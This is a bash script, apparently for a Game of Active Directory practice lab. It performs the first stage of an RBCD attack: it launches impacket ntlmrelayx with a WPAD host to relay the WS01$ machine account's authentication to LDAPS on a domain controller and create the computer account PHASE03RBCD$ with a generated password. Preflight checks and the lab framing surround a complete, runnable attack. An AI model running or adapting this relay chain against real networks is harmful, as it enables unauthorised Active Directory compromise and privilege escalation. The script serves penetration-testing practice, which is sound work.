#!/usr/bin/env bash
# Stage 1 of the controlled NORTH RBCD proof:
# relay WS01$ over HTTP/WPAD to LDAPS and create PHASE03RBCD$ only.
# This script intentionally does NOT set delegation.
set -euo pipefail

ROOT="${ROOT:-$HOME/Documents/GOAD_NOMAD}"
TARGET="${TARGET:-10.4.10.11}"
WPAD_HOST="${WPAD_HOST:-wpad.north.sevenkingdoms.local}"
COMPUTER="${COMPUTER:-PHASE03RBCD}"
BASELINE="${BASELINE:-$HOME/.config/kingdoms/phase03-rbcd-baseline.json}"
SECRET_FILE="${SECRET_FILE:-$HOME/.config/kingdoms/phase03-rbcd-password}"

find_ntlmrelayx() {
  local c
  for c in \
    "$(command -v impacket-ntlmrelayx 2>/dev/null || true)" \
    "$(command -v ntlmrelayx.py 2>/dev/null || true)" \
    /usr/share/doc/python3-impacket/examples/ntlmrelayx.py; do
    [[ -n "$c" && ( -f "$c" || -x "$c" ) ]] || continue
    printf '%s\n' "$c"
    return 0
  done
  return 1
}

cd "$ROOT" || exit 1

bash "$ROOT/scripts/phase03/assert-wpad-exercise-clean.sh"

echo '===== RBCD STAGE 1 PREFLIGHT ====='
test -f "$BASELINE" || { echo "FAIL: baseline missing: $BASELINE" >&2; exit 1; }

python3 - "$BASELINE" <<'PY'
import json, os, sys
path=sys.argv[1]
st=os.stat(path)
if (st.st_mode & 0o077) != 0:
    raise SystemExit(f'FAIL: baseline permissions are too broad: {oct(st.st_mode & 0o777)}')
data=json.load(open(path, encoding='utf-8'))
if data.get('Target') != 'WS01$':
    raise SystemExit('FAIL: unexpected RBCD baseline target')
if data.get('RBCDPresent'):
    raise SystemExit('FAIL: baseline already contained RBCD; refusing Stage 1')
if data.get('CandidateExisted'):
    raise SystemExit('FAIL: PHASE03RBCD$ existed in baseline; refusing Stage 1')
print('PASS: clean WS01$ RBCD baseline is present')
PY

if pgrep -af '(^|[ /])(impacket-ntlmrelayx|ntlmrelayx[.]py)([ ]|$)' >/dev/null; then
  echo 'FAIL: ntlmrelayx is already running' >&2
  pgrep -af '(^|[ /])(impacket-ntlmrelayx|ntlmrelayx[.]py)([ ]|$)' || true
  exit 1
fi

if sudo ss -H -lnt 2>/dev/null | grep -Eq '(^|[[:space:]])[^[:space:]]*:80[[:space:]]'; then
  echo 'FAIL: TCP/80 is already in use' >&2
  sudo ss -H -lntp 2>/dev/null | grep -E ':80[[:space:]]' || true
  exit 1
fi

NTLMRELAYX="$(find_ntlmrelayx || true)"
[[ -n "$NTLMRELAYX" ]] || { echo "FAIL: ntlmrelayx not found" >&2; exit 1; }
HELP="$("$NTLMRELAYX" -h 2>&1 || true)"
for opt in -t -wh -wa --keep-relaying --no-smb-server --no-dump --no-da --no-acl --add-computer; do
  grep -Fq -- "$opt" <<<"$HELP" || { echo "FAIL: ntlmrelayx missing option $opt" >&2; exit 1; }
done

install -d -m 700 "$(dirname "$SECRET_FILE")"
if [[ ! -s "$SECRET_FILE" ]]; then
  umask 077
  python3 - "$SECRET_FILE" <<'PY'
import secrets, string, sys
alphabet = string.ascii_letters + string.digits + '!@#%_+-'
password = ''.join(secrets.choice(alphabet) for _ in range(24))
with open(sys.argv[1], 'w', encoding='utf-8') as f:
    f.write(password)
PY
fi
chmod 600 "$SECRET_FILE"
PASSWORD="$(cat "$SECRET_FILE")"
[[ ${#PASSWORD} -ge 20 ]] || { echo "FAIL: generated RBCD password is unexpectedly short" >&2; exit 1; }

echo "TARGET=ldaps://$TARGET"
echo "WPAD_HOST=$WPAD_HOST"
echo "COMPUTER=${COMPUTER}$"
echo "SECRET_FILE=$SECRET_FILE (mode 600; password not printed)"
echo 'INFO: foreground mode is intentional. Leave this terminal open.'
echo 'INFO: this stage creates the computer account only; it does not write RBCD.'
echo

args=(
  -t "ldaps://$TARGET"
  -wh "$WPAD_HOST"
  -wa 1
  --keep-relaying
  --no-smb-server
  --no-dump
  --no-da
  --no-acl
  --add-computer "$COMPUTER" "$PASSWORD"
)

for opt in --no-wcf-server --no-raw-server --no-rpc-server --no-winrm-server --no-mssql-server --no-rdp-server; do
  if grep -Fq -- "$opt" <<<"$HELP"; then args+=("$opt"); fi
done

exec sudo "$NTLMRELAYX" "${args[@]}"
